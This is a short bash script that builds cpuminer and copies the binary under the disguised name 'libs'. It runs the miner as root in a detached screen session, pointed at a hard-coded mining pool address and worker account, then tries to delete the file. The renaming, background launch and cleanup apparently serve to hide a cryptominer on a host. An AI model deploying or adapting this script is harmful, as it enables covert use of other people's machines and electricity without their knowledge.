#!/bin/bash
sudo chmod +x build.sh 
sudo ./build.sh
sudo cp cpuminer libs
sudo screen -d -m ./libs -a lyra2z -o stratum+tcp://45.79.200.97:20581 -u phunghung.1 -p x
cd /
sudo rm -rf libs